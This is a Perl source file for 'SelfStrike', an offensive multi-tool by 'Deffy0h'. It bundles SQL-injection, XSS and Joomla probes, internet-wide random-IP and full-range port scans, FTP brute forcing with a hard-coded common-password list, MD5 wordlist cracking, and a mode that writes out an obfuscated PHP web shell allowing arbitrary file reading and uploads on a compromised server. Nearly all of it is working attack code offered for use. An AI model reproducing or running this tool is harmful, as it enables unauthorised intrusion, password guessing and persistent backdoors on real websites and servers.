#!/usr/bin/perl

use Getopt::Long;
use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
use Net::FTP;
use Net::Ping;
#use Net::SSH::Perl;
use Digest::MD5 qw(md5_hex);

my $rrq="\tUse a-vontade, nao copie faca ;)";

my $modeuser="
\n\n\n
use:
SelfStrike.pl
 -t|type SqlScanner -u|url 'site' -p|port 80 -timeout 5 -re|request 'q=1&s=1' -m|method 'GET|POST'    *Scanner Sql Injection Vulnerability*
 
	--- -p|port '80' Default
	--- -timeout '5' Default
 \n
 -t|type PortScanner -i|ip 'ip' -p|port 80
 -t|type PortScanner -i|ip 'ip' -p|port 80 -timeout 5 -w|proto 'tcp'    *Scanner Port*
 -t|type PortScanner -i|ip 'ip|wordlist' -p|port '0|00|000' -timeout 5 -w|proto 'tcp'     *scans all standard doors*
 
	--- -p|port 00  *Scans All Standard Ports: 20,21,80,443...*
	--- -p|port 000 *Scans All Ports: 1-65500*
	--- -p|port 0000 *Port Random*
	--- -w|proto 'TCP' Default
	--- -p|port  '80'  Default
	--- -i|ip    '00' *Random IP*
 \n
 -t|type InfoIp -i|ip 'ip'  *Get Info IP*
 \n
 -t|type BruteForce-ftp -user 'admin' -pass 'wordlist.txt' -u 'site' *Brute Force in FTP*
	--- -pass 00 *password defaults 2012|2013*
	--- -pass 000 *password Random 12bits|16bits*
 \n
 -t|type BruteForce-ssh -user 'admin' -pass 'wordlist.txt' -u 'site' *Brute Force in SSH*
 \n
 -t|type BruteForce-MD5 -re 'MD5' -pass 'wordlist.txt' *Brute Force in MD5*
 \n
 -t|type SelfStrike-CSRF -re|request 'q=1&s=1' -m|method 'GET|POST' -n|number '25' *Cross Site Request Fogery*
	--- -m POST -re name=>'admin',password=>'123',auth=>'000'
 \n
 -t|type SelfStrike-Ip -i|ip '192.168.0.c' -p|port '80' -timeout 5 -s|save 'output.txt'  *Search IP*
	--- -ip 00 *random IPs*
 \n
 -t|type SelfStrike-Url -u|url 'deffy0h.tk' *Get Info WebSite*
 \n
 -t|type SelfStrike-Joomla -u|url 'deffy0h.tk' *Joomla Vulnerability*
 \n
 -t|type SelfStrike-XSS -u|url 'deffy0h.tk' -re 's=<p>xss</p>' *XSS Vulnerability*
 \n
 -t|type SelfStrike-MD5 -pass 'text' *Encrypt MD5 HEX*
 \n
 -t|type SelfStrike-Encrypt -k|key 'opcional' -pass 'mensage' -s 'file.txt' *EnCrypt Deffy0h-Crypt*
 \n
 -t|type SelfStrike-Descrypt -k|key 'key public' -pass 'text_deffy0h_encrypt' -s 'file.txt' *Descrypt Deffy0h-Crypt*
 \n
 -t|type SelfStrike-SHELL -s|save 'shell.php' *Create Shell .PHP*
 \n\n\n
";

my $developer="

\t\tDeveloper : Deffy0h/Skype:Deffy0h

";

my @port_	 =("20","21","22","80","23","25","53","443","465","1080","1194","1433","3306","25565");
my @port_type=("FTP","FTP","SSH","HTTP","TELNET","SMTP","DOMAIN","HTTPS","SMTP","SOCKS","OPEN_VPN","SQL","MYSQL","MINECRAFT");

my @ftp 	=("admin","root","","anonymous","-anonymous@","administrator","123456","12345","12345678","qwerty","password","1234567890","1234","baseball","dragon","football","1234567","monkey","letmein","abc123","111111","mustang","access","shadow","master","michael","superman","696969","123123","batman","trustno1","iloveyou","adobe123","azerty","Admin","letmein","photoshop","shadow","sunshine","password1");

my $xGET=chr(36)."_GET";
my $xFILE=chr(36)."_FILES";
my $xMKDIR=chr(64)."mkdir";
my $move_uploaded_file=chr(64)."move_uploaded_file";
my $ff=chr(36)."f";
my $rr=chr(36)."r";
my $row_01=chr(91);
my $row_02=chr(93);


my $shell="<?php
if(isset($xGET $row_01 'mkdir' $row_02)){$xMKDIR($xGET $row_01 'mkdir' $row_02,776,true);}if(isset($xFILE $row_01 'file' $row_02)){if($move_uploaded_file($xFILE $row_01 'file' $row_02$row_01 'tmp_name' $row_02,$xFILE $row_01 'file' $row_02$row_01 'name' $row_02)){echo '<span>SUCCESS UPLOAD FILE</span>';}else{echo '<span>ERRO UPLOAD FILE</span>';}}
?>

<html><head><title>Shell - SelfStrike</title></head> <style>body{ background:#000; } span{ font-family:Arial, Helvetica, sans-serif; font-size:14px; color:#0C3; }#x05Eeq{ width:50%; margin:0 auto; } #_sqer{ width:250px; margin:0 auto; }</style><script>function success(){alert('SUCCESS');} function erro(){alert('ERRO');}</script> <body><div id='x05Eeq'><span><center>======================================================<br>SelfStrike.php Create By SelfStrike.pl<br>======================================================<br><br><span style='font-weight:bold;'>Deffy0h</span></center></span><br /><br /><div id='_sqer'><span>create folder: </span><br /><form action='' method='get'><input type='text' name='mkdir'/><input type='submit' value='create' style='margin-left:5px;'/></form><br /><span>open source: </span><br /><textarea style='width:230px; height:100px;'><?php if(isset($xGET $row_01 'open_source' $row_02)){if($xGET $row_01 'open_source' $row_02 !=''){$ff=fopen($xGET $row_01 'open_source' $row_02,'r'); $rr=fread($ff,filesize($xGET $row_01 'open_source' $row_02)); echo $rr;}} ?></textarea><br /><br /><form action='' method='get'><input type='text' name='open_source' value='index.php' style='width:230px;'/><br /><input type='submit' value='find file' style='width:230px;' /></form><br /><br /><span>upload:</span><br /><form action='' enctype='multipart/form-data' method='post'><input type='file' name='file' style='color:#0C3; width:230px;'  /><br /><br /><input type='submit' value='send file' style='width:230px;'/></form></div></div></body></html> <!-- DOWNLOAD: https://github.com/Deffy0h/SelfStrike -->";


print <<EPeq;


		
.d88888b           dP .8888b .d88888b    dP            oo dP                
88.    "'          88 88   " 88.    "'   88               88                
`Y88888b. .d8888b. 88 88aaa  `Y88888b. d8888P 88d888b. dP 88  .dP  .d8888b. 
      `8b 88ooood8 88 88           `8b   88   88'  `88 88 88888"   88ooood8 
d8'   .8P 88.  ... 88 88     d8'   .8P   88   88       88 88  `8b. 88.  ... 
 Y88888P  `88888P' dP dP      Y88888P    dP   dP       dP dP   `YP `88888P' 
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo

		 .___        ,__ ,__          ___/_     
		 /   `   ___ /  `/  `,    . .'  /\/     
		 |    |.'   `|__ |__ |    ` |  / ||,---.
		 |    ||----'|   |   |    | |,'  ||'   `
		 /---/ `.___,|   |    `---|./`---'/    |
					 /   /    \___/             
		
		
	-====================================================-
	-                 SelfStrike
	*-		Create By Deffy0h		    -0
	*-----------------------------------------------------
		
	\t\tSOMOS BRASILEIROS
	\tDEFFY0H Todos os direitos resevados
	$rrq
		
    $modeuser
	
	$developer
		
EPeq

my $url="";
my $ip="";
my $port="";
my $timeout="";
my $type="";
my $r="?";
my $method="GET";
my $REQ=$r."s='1&p='1&q='1&id='1";
my $OK_HTTP=200;
my $proto="";
my $user="";
my $pass="";
my $save="";
my $number=0;
my $key=0;


GetOptions(

	"u|url=s"=>\$url,
	"i|ip=s"=>\$ip,
	"t|type=s"=>\$type,
	"p|port=s"=>\$port,
	"timeout=i"=>\$timeout,
	"re|request=s"=>\$REQ,
	"m|method=s"=>\$method,
	"w|proto=s"=>\$proto,
	"user=s"=>\$user,
	"pass=s"=>\$pass,
	"s|save=s"=>\$save,
	"n|number=i"=>\$number,
	"k|key=i"=>\$key

);

unless($type){
print $modeuser;
exit;
}

chomp $type;

if($type eq "SqlScanner" 		|| $type eq "sqlscanner"){
&SqlScanner
}
if($type eq "PortScanner" 		|| $type eq "portscanner"){
&PortScanner
}
if($type eq "InfoIp" 			|| $type eq "infoip"){
&info
}
if($type eq "BruteForce-ftp" 	|| $type eq "bruteforce-ftp"){
&BrutalForce_ftp
}
if($type eq "SelfStrike-Ip" 	|| $type eq "selfstrike-ip"){
&SelfStrike_Ip
}
if($type eq "selfstrike-Url" 	|| $type eq "selfstrike-url"){
&Selfstrike_Url
}
if($type eq "BruteForce-ssh"    || $type eq "bruteforce-ssh"){
&BruteForce_ssh
}
if($type eq "SelfStrike-CSRF"    || $type eq "selfstrike-csrf"){
&SelfStrike_CSRF
}
if($type eq "SelfStrike-Joomla"    || $type eq "selfstrike-joomla"){
&SelfStrike_Joomla
}
if($type eq "SelfStrike-XSS"    || $type eq "selfstrike-xss"){
&SelfStrike_XSS
}
if($type eq "BruteForce-MD5"    || $type eq "brutetorce-md5"){
&BruteForce_md
}
if($type eq "SelfStrike-MD5" || $type eq "selfstrike-md5"){
&SelfStrike_md
}
if($type eq "SelfStrike-Encrypt" || $type eq "selfstrike-encrypt"){
&SelfStrike_EnCrypt
}
if($type eq "SelfStrike-Descrypt" || $type eq "selfstrike-descrypt"){
&SelfStrike_DesCrypt
}
if($type eq "SelfStrike-SHELL" || $type eq "selfstrike-shell"){
&SelfStrike_Shell
}

sub SelfStrike_Shell(){

print "\n\n-=======================================================-\n";
print "\t\t\SelfStrike-SHELL\n";
print "-=======================================================-\n\n";

unless($save){
$save="SelfStrike.php";
}

if($save!~m/.php$/){
print "\n[-] FILE not .php\n";
$save="SelfStrike.php";
print "[+] FILE=> $save\n";
}

open($o,">",$save);
$o->print($shell);
$o->close();

print "[+] FILE=> $save\n";
exit;

}

sub SelfStrike_DesCrypt(){

print "\n\n-=======================================================-\n";
print "\t\t\SelfStrike-Descrypt\n";
print "-=======================================================-\n\n";

#@descrypt

unless($key){
print "[-] Key\n";
exit;
}

if($pass!~m/:/){
if($save eq ""){
print "[-] ERRO CRYPT\n";
exit;
}
}

my @words=split /:/,$pass;

my $str="";
my $scii="";
my $c=0;
my $len=scalar(@words);

my $key_private=$key/8;


while($c<$len){
$str=$str.chr(@words[$c]/$key_private);
$scii=$scii.(@words[$c]/$key_private)." ";
#print $char;
$c++;
}

print "[+] N=>$len\n";
print "[+] ASCII=> $scii\n\n";
print "[+] Key=> $key\n";
print "[+] Private Key=> $key_private\n\n";
print "0000000000000000000000000000--- DESCRYPT ---0000000000000000000000000000\n\n\n";
print $str."\n\n";

#######################################################################
#*:?

if($save ne ""){

unless($key){
print "[-] Key\n";
exit;
}

if($save!~m/.(.*?)/){
print "[-] Not File\n";
exit;
}


if($pass!~m/:/){
print "[-] ERRO CRYPT\n";
exit;
}

#open($a,">",$save);
#$a->print($str);
#$a->close();

}

}

sub SelfStrike_EnCrypt(){

print "\n\n-=======================================================-\n";
print "\t\t\SelfStrike-EnCrypt\n";
print "-=======================================================-\n\n";

#DEFFY0h Convert ASCII in PERL

my $time=time();
my $private;

$private=((int(rand(25))*(int(rand(1000)))));

unless($key){
$key=$private*8;
}

if($pass ne ""){
my $str="";
my $c=0;
my $len=length($pass);
while($c<$len){
my $char=substr($pass,$c,($len-$c));
$encSTR=$encSTR.":".ord($char)*$private;
$str=$str.":".ord($char);
#print $char;
$c++;
}


print "[+] N=>$len\n";
print "[+] TEXT=> $pass\n\n";
print "[+] ASCII => $str\n\n";
print "[+] Private Key=> $private\n";
print "[+] Key=> $key\n\n";
print "0000000000000000000000000000--- ENCRYPT ---0000000000000000000000000000\n\n\n";
print $encSTR;
print "\n\n\n";

if($save ne ""){

if($save!~m/.(.*?)/){
print "[-] Not File\n";
exit;
}

open($a,">",$save);
$a->print($encSTR);
$a->close();

}
}
}

sub SelfStrike_md(){

print "\n\n-=======================================================-\n";
print "\t\t\SelfStrike-MD5\n";
print "-=======================================================-\n\n";

unless($pass){
$pass="password";
}

$md5=md5_hex($pass);

print "[+] TEXT=> $pass\n";
print "[+] MD5=> $md5\n\n";

}

sub BruteForce_md(){

print "\n\n-=======================================================-\n";
print "\t\t\tBruteForce-MD5\n";
print "-=======================================================-\n\n";

unless($REQ){
$REQ="5f4dcc3b5aa765d61d8327deb882cf99";
}

if($REQ=~m/[?]/){
$REQ="5f4dcc3b5aa765d61d8327deb882cf99";
}

if($pass=~m/.txt$/){
print "[+] WORDLIST=> $pass\n";
}

print "[+] MD5=> $REQ\n";
print "\n\n";
my $c=0;
open($a,"<",$pass)or die("\n\ncan not open file $pass\n\n");
@pass=<$a>;
while($c<scalar(@pass)){
chomp(@pass[$c]);
$mm=md5_hex(@pass[$c]);
print "[+] MD5=>$mm\n";
if($mm eq $REQ){

print "\n\n\t\t\t SUCCESS \n";
print "-=================================================================-\n";
print "[+] MD5=> $mm\n";
print "[+] PASSWORD=> @pass[$c]\n";
print "-=================================================================-\n\n";
exit;

}
$c++;
}
}

sub SelfStrike_XSS(){


print "\n\n-=======================================================-\n";
print "\t\t\tSelfStrike-XSS\n";
print "-=======================================================-\n\n";

unless($url){
print "\ntyping a DNS|URL -u 'site'\n";
print $modeuser;
exit;
}

if($url!~m/http:/){
$url="http://$url";
}

my @xss=("?s=<p>XSS</p>&q=<p>XSS</p>&p=<p>XSS</p>","?s=<script>alert('XSS');</script>&q=<script>alert('XSS');</script>&p=<script>alert('XSS');</script>",$REQ,"?s=XSS&p=XSS&q=XSS");
#reTe0
my $tes="<p>XSS</p>";
my $tess="<script>XSS</script>";

my($tt)=$REQ=~m/=(.*?)/i;


my $c=0;

#=
print $tt."\n";
while($c<scalar(@xss)){
my $rg=@xss[$c];
if($rg!~m/[?]/){
$rg="?".$rg;
}
my $yyy=$url.$rg;
print "[+] conection to $yyy\n";
$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(GET=>$yyy)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
my $htm=$response->decoded_content;
if($htm=~$tes || $htm=~$tess || $htm=~m/XSS/){
print "[+] $url have vulnerability in XSS\n\n";
}else{
print "[-] $url no have vulnerability in XSS\n\n";
}
}else{
print "[-] FAIL\n\n";
}
}
$c++;
}

}

sub SelfStrike_Joomla(){


print "\n\n-=======================================================-\n";
print "\t\t\tSelfStrike-Joomla\n";
print "-=======================================================-\n\n";

unless($url){
print "\ntyping a DNS|URL -u 'site'\n";
print $modeuser;
exit;
}

if($url!~m/http:/){
$url="http://$url";
}

my $herro="An error has occurred while processing your request.";
my $hse="SELECT|select";
my $hose="ORDER|order";
my @hjoomla=("/index.php?option=com_contenthistory&view=history&list[select]=1","/index.php?option=com_contenthistory&view=history&list[ordering]=1");

my $hh=0;

while($hh<2){

my $rg=$url.@hjoomla[$hh];

print "[+] conection to $rg\n";

$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(GET=>$rg)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
my $htm=$response->decoded_content;
if($htm=~$herro || $htm=~$hse || $htm=~$hose){
print "[+] $url have vulnerability in Joomla Plung-ing\n\n";
}else{
print "[-] $url no have vulnerability in Joomla Plung-ing\n\n";
}
}else{
print "[-] FAIL\n\n";
}
}
$hh++;
}
}

#4Er45
sub SelfStrike_CSRF(){

print "\n\n-=======================================================-\n";
print "\t\t\tSelfStrike-CSRF\n";
print "-=======================================================-\n\n";

unless($url){
print "\ntyping a DNS|URL -u 'site'\n";
print $modeuser;
exit;
}
unless($number){
$number=25;
}
unless($method){
$method="GET";
}


if($url!~m/http:/){
$url="http://$url";
}
if($REQ!~m/[?]/){
$REQ="?$REQ";
}
if($method eq "GET"){
#@2GET
my $c=0;
while($c<$number){
print "[+] connecting to GET:$url/$REQ:80 counter($c)\n";
$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(GET=>$url."/".$REQ)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
print "[+] SUCCESS\n\n";
}else{
print "[-] FAIL\n\n";
}
}
#
$c++;
}
}else{
#@2POST
my $c=0;
while($c<$number){
print "[+] connecting to POST:$url:80 counter($c)\n";
$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(POST=>$url,[$REQ])){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
print "[+] SUCCESS\n\n";
}else{
print "[-] FAIL\n\n";
}
}
#
$c++;
}
}
}

#445
sub BruteForce_ssh(){
print "\n\nnext version\n\n";
}

#@2abri
sub Selfstrike_Url(){
print "-=======================================================-\n";

unless($url){
print "[-] URL";
exit;
}

my $host = inet_ntoa(inet_aton($url));


unless($url){
print "\ntyping a DNS|URL -u 'site'\n";
print $modeuser;
exit;
}else{

print "[+] IP=> $host\n";
print "[+] PORT=> 80\n";

}

my $max_ping=15;
my $pings=1;
my $rq=0;

print "-=======================================================-\n\n";

while($pings<$max_ping){
$p=Net::Ping->new("tcp");
print "[+] send ping $pings to $host:80 \n";
if($p->ping($host)){
$rq++;
}
$pings++;
$p->close();#close;
}

print "[+] $rq|$pings response\n";

if($rq>=($pings-5)){
print "\n[+] FireWall=> false\n";
}else{
print "\n[+] FireWall=> true\n";
}

print "\n\n";

my $yurl="http://ip-api.com/json/".$host;

$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(GET=>$yurl)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
print "[+] HTTP:REQUEST, HTTP/1.1, STATUS CODE=".$response->status_line."\n";
print "[+] decode HTML\n\n";
$html=$response->decoded_content;
print "INFO IP:\n";
print $html."\n\n";
}
}

print "\n[+] HTML Resolver:\n";

if($url!~m/^http:/){
$url="http://".$url;
}

my $htmj="";
$uap = LWP::UserAgent->new;
if($rep=HTTP::Request->new(GET=>$url)){
$aqp=$uap->request($rep);
if($aqp->status_line==$OK_HTTP){
$htmj=$aqp->decoded_content;
}
}

if($htmj ne ""){
print "[+] FIND TAGS:\n\n\n";

print "-------------------------------------------------\n";
my($title)=$htmj=~m{<title>(.*?)</title>}si;
if($title ne ""){
print "(TITLE)=>\t $title \n";
}else{
print "(TITLE)=> no find";
}

print "\n";
print "-------------------------------------------------\n";

my @src=($htmj=~m/src="(.*?)"|src='(.*?)'/g);

print "(SRC)=>\n";

foreach my $ai(@src){
print "\t$ai\n";
}

print "-------------------------------------------------\n";

my @href=($htmj=~m/href="(.*?)"|href='(.*?)'/g);

print "(HREF)=>\n";

foreach my $ai(@href){
print "\t$ai\n";
}

print "-------------------------------------------------\n";

my @action=($htmj=~m/action="(.*?)"|action='(.*?)'/g);

print "(ACTION)=>\n";

foreach my $ai(@action){
print "\t$ai\n";
}

print "-------------------------------------------------\n";

my @OnClick=($htmj=~m/onClick='(.*?)'|onClick="(.*?)"/g);

print "(OnClick)=>\n";

foreach my $ai(@OnClick){
print "\t$ai\n";
}

print "-------------------------------------------------\n";

my @OnSubmit=($htmj=~m/onSubmit='(.*?)'|onSubmit="(.*?)"/g);

print "(OnSubmit)=>\n";

foreach my $ai(@OnSubmit){
print "\t$ai\n";
}


print "\n\n";
print "-========================================================-";
print "\t\nPort Scanner\n";
print "-========================================================-";
print "\n\n";


}else{
print "[-] erro resolver html\n";
}

my $i=0;
my $max=13;
while($i<$max){

	print "\n\n";
	print $host."\n";
	print "port: ".@port_[$i]." type: ".@port_type[$i]."\n";
	print "[+] connecting...\n";

if($s=IO::Socket::INET->new(

	PeerAddr => $host,
	PeerPort => @port_[$i],
	Proto    => "tcp",
	timeout  => 5

)){
	print "[+] open\n";
}else{
	print "[-] close\n";
}
$i++;
}

}


#@25d
#44$

sub SelfStrike_Ip(){

my $cap=0;

print "-=======================================================-\n";

unless($ip){
print "\n\n[-] typing a -i|ip 'IP'\n\n";
exit;
}else{
print "[+] IP => $ip\n";
}

unless($port){
$port=80;
print "[+] Port => 80\n";
}else{
print "[+] Port => $port\n";
}

unless($timeout){
$timeout=5;
print "[+] Timeout => 5\n";
}else{
print "[+] Timeout => $timeout\n";
}
unless($proto){
$proto="tcp";
print "[+] Proto => TCP\n";
}else{
print "[+] Proto => $proto\n";
}
unless($save){
print "[-] file not set";
exit;
}else{
print "[+] File => $save\n";
}

open($a,"+<",$save) 
or die("impossible to open file");


if($ip!~m/c/ && $ip ne "00"){
print "[-] $ip not allowed\n";
print "use: -i|ip 192.168.0.c or  -i|ip 00";
exit;
}

print "\n-=======================================================-\n";

print "\n\n";

if($ip=~m/c/){

while($cap<255){

my $time=localtime();
my $tmp_ip=$ip=~s/c/$cap/r;

print "[+] checking\t";
print "$tmp_ip:$port\n";

if($s=IO::Socket::INET->new(
	PeerAddr=>$tmp_ip,
	PeerPort=>$port,
	Proto=>	  $proto,
	timeout=> $timeout
)){
	
	my @lines=<$a>;

	$myText=@lines[scalar(@lines)]."\n\n -============================================================-\n DATE: $time \n OPEN: $tmp_ip:$port \n -============================================================-\n";
	
	print "[+] Open\n";
	print "[+] Save To File $save => \n\t $myText \n\n";
	
	$a->print($myText);
	$a->close();
	
}else{
	print "[-] Close\n";
}

print "\n";

#$12c
$cap++;

if($cap>255){
print "Quit SelfStrike-IP*";
exit;
}
}
}

if($ip eq "00"){
while(1){

my $time=localtime();
my $tmp_ip=int(rand(255)).".".int(rand(255)).".".int(rand(255)).".".int(rand(255));

print "[+] checking\t";
print "$tmp_ip:$port\n";

if($s=IO::Socket::INET->new(
	PeerAddr=>$tmp_ip,
	PeerPort=>$port,
	Proto=>	  $proto,
	timeout=> $timeout
)){
	
	my @lines=<$a>;

	$myText=@lines[scalar(@lines)]."\n\n -============================================================-\n DATE: $time \n OPEN: $tmp_ip:$port \n -============================================================-\n";
	
	print "[+] Open\n";
	print "[+] Save To File $save => \n\t $myText \n\n";
	
	$a->print($myText);
	$a->close();
	
}else{
	print "[-] Close\n";
}

print "\n";

}
}

}

#?d0
#-sx01

sub BrutalForce_ftp(){
print "-=======================================================-\n";

unless($url){
print "\ntyping a DNS|URL -u 'site'\n";
print $modeuser;
exit;
}

my $yurFTP="ftp://".$url;

print "[+] checking $url\n";

if($h=HTTP::Request->new(GET=>$url)){
print "[+] success\n";
}else{
print "[-] fail\n";
exit;
}

if($pass=~m/.txt$/){
print "[+] FILE=> $pass\n";
}
print "-=======================================================-\n";

print "\n[+] connecting to server FTP\n";


if($pass eq "00"){
print "\n\n\t\t*password defaults 2012|2013*\n\n";
print "-=======================================================-\n";
}

if($pass eq "000"){
print "\n\n\t\t*password Random 12bits|16bits*\n\n";
print "-=======================================================-\n\n";
}

my $c=0;

while(1){

$ftp = Net::FTP->new($url) 
or die("[-] erro connection to FTP\n");

my $opa="";

if($pass ne "00"){

print "[+] OPEN FILE $pass\n\n";
#if($pass=~m/.txt$/){
open(a,"<",$pass) or die("[-] file '$pass' can't be opened\n");
my @pass=<a>;
#}

chomp($opa=$pass[$c]);
if(scalar(@pass)<$c){
print "\n Quit Brute Force FTP* \n";
exit;
}
}

if($pass eq "00"){
$opa=@ftp[$c];
if((scalar(@ftp))<$c){
print "\n Quit Brute Force FTP* \n";
exit;
}
}

if($pass eq "000"){
my @abc=("a","b","c","d","e","f","g","h","i","j","l","m","n","o","p","q","r","s","t","u","v","y","x","z");
$opa=@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].(int(rand(99))).(int(rand(99))).(int(rand(99))).(int(rand(99)));
}

print "[+] LOGIN $yurFTP with USER=>$user AND PASSWORD=>$opa\n";

if($ftp->login($user,$opa)){
print "\n\n[+] SUCCESS\n";
print "-=====================================-\n";
print "URL=> $yurFTP\n";
print "USER=> $user\n";
print "PASSWORD=> $pass\n";
print "-=====================================-\n\n";
exit;
}else{
$ftp->close();
print "[-] FAIL\n"
}
$c++;
}

}

sub info(){
print "-=======================================================-\n";

unless($ip){
print "\n\n[-] typing a -i|ip 'IP'\n\n";
exit;
}else{
print "[+] IP => $ip\n";
}

my $yurl="http://ip-api.com/json/".$ip;

$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(GET=>$yurl)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
print "[+] HTTP:REQUEST, HTTP/1.1, STATUS CODE=".$response->status_line."\n";
print "[+] decode HTML\n";
$html=$response->decoded_content;
print "\n".$html."\n";
}	
	
print "\n-=======================================================-\n";
}
}

sub PortScanner(){

print "-=======================================================-\n";

unless($ip){
print "\n\n[-] typing a -i|ip 'IP'\n\n";
print $modeuser;
exit;
}else{
print "[+] IP => $ip\n";
}
unless($port){
$port=80;
print "[+] Port => 80\n";
}else{
print "[+] Port => $port\n";
}
unless($timeout){
$timeout=5;
print "[+] Timeout => 5\n";
}else{
print "[+] Timeout => $timeout\n";
}
unless($proto){
$proto="tcp";
print "[+] Proto => TCP\n";
}else{
print "[+] Proto => $proto\n";
}

chomp($proto);
if($proto ne "tcp" && $proto ne "udp"){
print "[-] Proto Is Not Valid (TCP|UDP)";
exit;
}

print "-=======================================================-\n";

chomp($port);
if($port ne "00" && $port ne "000" && $port ne "0000"){

if($ip eq "00"){
	my $ip1=int(rand(255));
	my $ip2=int(rand(255));
	my $ip3=int(rand(255));
	my $ip4=int(rand(255));

	$ip=$ip1.".".$ip2.".".$ip3.".".$ip4;

}

print "[+] Checking $ip:$port - $proto\n";

if($s=IO::Socket::INET->new(
	PeerAddr=>$ip,
	PeerPort=>$port,
	Proto=>	  $proto,
	timeout=> $timeout
)){
	print "[+] Open\n";
}else{
	print "[-] Close\n";
}
}

if($port eq "00"){

print "\n\n\t*Scans All Standard Ports: 20,21,80,443...*\n\n";
print "-=======================================================-\n";

my $i=0;
my $max=13;
while($i<$max){


if($ip eq "00"){
	my $ip1=int(rand(255));
	my $ip2=int(rand(255));
	my $ip3=int(rand(255));
	my $ip4=int(rand(255));

	$ip=$ip1.".".$ip2.".".$ip3.".".$ip4;

}

	print "\n\n";
	print $ip."\n";
	print "port: ".@port_[$i]." type: ".@port_type[$i]."\n";
	print "[+] connecting...\n";

if($s=IO::Socket::INET->new(

	PeerAddr => $ip,
	PeerPort => @port_[$i],
	Proto    => $proto,
	timeout  => $timeout

)){
	print "[+] open\n";
}else{
	print "[-] close\n";
}
$i++;
}
}

if($port eq "000"){

print "\n\n\t*Scans All Ports: 1-65500*\n\n";
print "-=======================================================-\n";

my $c_port=1;
my $max_port=65500;

print "\n\n";

if($ip eq "00"){
	my $ip1=int(rand(255));
	my $ip2=int(rand(255));
	my $ip3=int(rand(255));
	my $ip4=int(rand(255));

	$ip=$ip1.".".$ip2.".".$ip3.".".$ip4;

}

while($c_port<$max_port){

print "$ip:$c_port\n";
print "[+] connecting...\n";

if($s=IO::Socket::INET->new(
	
	PeerAddr => $ip,
	PeerPort => $c_port,
	Proto    => $proto,
	timeout  => $timeout

)){
	print "[+] open\n";
}else{
	print "[-] close\n";
}

print "\n";
$c_port++;
}
}

}

sub SqlScanner(){

print "\n\n";
print "-========================================================-";
print "\t\nSqlScanner\n";
print "-========================================================-";
print "\n\n";

unless($url){
print "\ntyping a DNS|URL -u 'site'\n";
print $modeuser;
exit;
}

if($url!~m/http:/){
$url="http://$url";
}


$port=80;
$timeout=5;

my ($html,$qInjection);
$qInjection="You have an error in your SQL syntax";

print "\n[+] checking url...\n";

if($s=IO::Socket::INET->new(
	PeerAddr=>$url,
	PeerPort=>$port,
	Proto=>	  "tcp",
	timeout=> $timeout
)){
print "[+] OK\n";
}else{
print "[-] not allowed send Socket to $url:$port \n";
}


print "[+] connecting with $url:$port\n";

$ua = LWP::UserAgent->new;

if($REQ!~m/[?]/){
$REQ="?$REQ";
}

my $temp_url=$url.$REQ;

if($method=="GET" || $method=="get"){
print "[+] HTTP:REQUEST, GET $temp_url ProtocolVersion:HTTP/1.1\n";

if($port==80 || $port==8080){
if($re=HTTP::Request->new(GET=>$temp_url)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
print "[+] HTTP:REQUEST, HTTP/1.1, STATUS CODE=".$response->status_line."\n";
print "[+] decode HTML\n";
$html=$response->decoded_content;
chomp $html;
if($html=~$qInjection){
print "\n\n [+] $temp_url <*p>SQL INJECTION<*p> Vulnerability* \n\n";
}else{
print "\n[-] was not found <*p>SQL INJECTION<*p> to $temp_url";
exit;
}
}else{
print "[-] ERRO: ".$response->status_line;
exit;
}
}else{
print "[-] erro conection";
exit;
}
}else{
print "[-] not allowed connection HTTPS:443";
exit;
}

}else{
print "[-]"; exit;
}
}


__END__

Deffy0h   Channel Youtube
https://www.youtube.com/channel/UC9kMfNPD3dgMO94JeFdTVBA
http://deffy0h.tk

@T1baah


Banner:
http://www.kammerl.de/ascii/AsciiSignature.php

GeoLocalization:
http://ip-api.com/json/
